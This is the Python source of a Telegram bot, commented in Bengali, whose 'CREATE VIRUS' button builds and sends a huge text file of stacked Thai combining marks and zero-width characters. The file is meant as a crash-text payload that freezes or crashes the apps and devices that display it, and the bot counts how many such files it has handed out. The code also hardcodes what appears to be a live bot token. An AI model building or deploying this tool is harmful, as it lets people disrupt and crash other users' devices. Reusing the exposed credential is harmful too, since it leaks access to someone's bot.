import logging
import sqlite3
import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. লগিং লেভেল সেট (অপ্রয়োজনীয় লগ বন্ধ করার জন্য)
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAFrbsGfvuO8ld-5FYGv1a5y0975NMDmkes"

# ৩. ডেটাবেস
def init_db():
    conn = sqlite3.connect('m_r_dev_final_fixed.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. পেলোড তৈরির ফাংশন
async def generate_virus_file(status_msg):
    filename = "M_R_DEVELOPER_VIRUS.txt"
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 35
    invisible = "\u200B\u200C\u200D\uFEFF" * 25
    chunk = (crash_pattern + invisible) * 500
    
    try:
        await status_msg.edit_text("⏳ ডাটাবেস লোড হচ্ছে (২০%)...")
        with open(filename, "w", encoding="utf-8") as f:
            for i in range(1, 1201):
                f.write(chunk)
                if i == 600:
                    await status_msg.edit_text("⏳ পেলোড রাইট হচ্ছে (৬০%)...")
        
        await status_msg.edit_text("✅ ১০০% সম্পন্ন! পাঠানো হচ্ছে...")
        return filename
    except Exception:
        return None

# ৫. মেইন হ্যান্ডলার
async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    
    text = update.message.text
    user_name = update.effective_user.first_name

    if text == "/start":
        # টাইপ এরর ফিক্স করতে persistent অপশনটি সরানো হয়েছে
        keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        await update.message.reply_text(
            f"🔥 **M R DEVELOPER ULTIMATE PANEL** 🔥\n\nহ্যালো {user_name}!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    elif text == "🚀 CREATE VIRUS":
        status_msg = await update.message.reply_text("🚀 প্রসেস শুরু হয়েছে...")
        file_path = await generate_virus_file(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(document=doc, caption="✅ সফলভাবে তৈরি হয়েছে।")
                
                conn = sqlite3.connect('m_r_dev_final_fixed.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
            except Exception: pass
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        await status_msg.delete()

    elif text == "📊 STATUS":
        conn = sqlite3.connect('m_r_dev_final_fixed.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 মোট তৈরি ভাইরাস: {total} টি।")

# ৬. রানার
def main():
    init_db()
    # drop_pending_updates=True কনফ্লিক্ট এরর ফিক্স করবে
    application = Application.builder().token(TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT, handle_interaction))
    
    print("---------------------------------------")
    print("M R DEVELOPER Bot is Live & Operational!")
    print("---------------------------------------")
    
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
